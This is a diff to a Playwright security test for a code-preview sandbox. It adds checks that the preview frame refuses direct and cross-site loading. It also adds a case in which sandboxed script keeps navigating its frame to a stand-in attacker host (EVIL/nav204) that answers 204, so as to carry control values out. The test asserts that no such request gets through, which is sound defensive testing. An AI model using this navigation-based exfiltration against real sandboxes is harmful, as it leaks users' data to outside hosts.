@@ -51,6 +51,9 @@ Promise.all(later).then(() => { document.getElementById("report").textContent = 
 `;
 const FLOOD = `setInterval(() => { for (let i = 0; i < 20; i++) parent.postMessage({ clay: 1, type: "ready", junk: "x".repeat(10000) }, "*"); }, 100);`;
 const NAVIGATE = `setTimeout(() => { location.href = "/"; }, 600);`;
+// The reviewer's case: a URL that answers 204 No Content keeps the document, so no second load event fires, and each
+// navigation sends the control values to another host.
+const NAVIGATE_204 = `setInterval(() => { location.href = "${EVIL}/nav204?size=" + clay.values.size + "&n=" + Date.now(); }, 300);`;
 
 const create = async (id: string, js: string) => {
   const r = await fetch(`${base}/api/playgrounds`, { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify(spec(id, js)) });
@@ -59,6 +62,7 @@ const create = async (id: string, js: string) => {
 await create(`sbx-probe-${tag}`, PROBE);
 await create(`sbx-flood-${tag}`, FLOOD);
 await create(`sbx-nav-${tag}`, NAVIGATE);
+await create(`sbx-nav204-${tag}`, NAVIGATE_204);
 
 const browser = await chromium.launch({ executablePath: process.env.CHROME ?? "/snap/bin/chromium" });
 const context = await browser.newContext();
@@ -71,6 +75,12 @@ let popups = 0;
 await context.route(/example\.com|lodash/, (route) => {
   external.push(`${route.request().resourceType()} ${route.request().url().slice(0, 60)}`);
   return route.abort();
+});
+// Registered later, so it takes precedence for these URLs: it answers 204 like the reviewer's endpoint, and counts.
+const nav204: string[] = [];
+await context.route(/example\.com\/nav204/, (route) => {
+  nav204.push(route.request().url());
+  return route.fulfill({ status: 204 });
 });
 
 let failed = 0;
@@ -98,7 +108,17 @@ async function probe(where: string, url: string, framed: boolean) {
   await page.close();
 }
 await probe("in the page", `${base}/p/sbx-probe-${tag}`, true);
-await probe("frame URL opened directly", `${base}/p/sbx-probe-${tag}/frame`, false);
+// Opened as a top-level page, the embedding page's frame-src does not apply, so the app serves no document at all.
+{
+  const page = await context.newPage();
+  const response = await page.goto(`${base}/p/sbx-probe-${tag}/frame`, { waitUntil: "load" });
+  await page.waitForTimeout(1500);
+  check("frame URL opened directly: no preview document is served", response?.status() === 403 && (await page.locator("#report").count()) === 0, `status ${response?.status()}`);
+  await page.close();
+}
+// Framed by another site: refused the same way (the browser marks the request cross-site).
+const foreign = await fetch(`${base}/p/sbx-probe-${tag}/frame`, { headers: { "Sec-Fetch-Dest": "iframe", "Sec-Fetch-Site": "cross-site" } });
+check("frame URL framed by another site: refused", foreign.status === 403, `status ${foreign.status}`);
 check("no request for an external host reached the network", external.length === 0, external.join(", "));
 check("no dialog was shown", dialogs.length === 0, dialogs.join(", "));
 check("no popup or new tab was opened", popups === 0);
@@ -113,6 +133,14 @@ for (const [id, what, text] of [[`sbx-flood-${tag}`, "a message flood stops the 
   await page.waitForTimeout(2500);
   const alert = await page.locator('p[role="alert"]').innerText().catch(() => "");
   check(what, text.test(alert) && (await page.locator("iframe").count()) === 0, alert.slice(0, 80));
+  await page.close();
+}
+// The preview keeps navigating its frame to a URL that answers 204. The page's frame-src must stop every such request.
+{
+  const page = await context.newPage();
+  await page.goto(`${base}/p/sbx-nav204-${tag}`, { waitUntil: "load" });
+  await page.waitForTimeout(3500);
+  check("a preview that navigates its frame to another host (204 answer) sends no request", nav204.length === 0, `${nav204.length} requests, first ${nav204[0]?.slice(0, 70) ?? "-"}`);
   await page.close();
 }
 await browser.close();
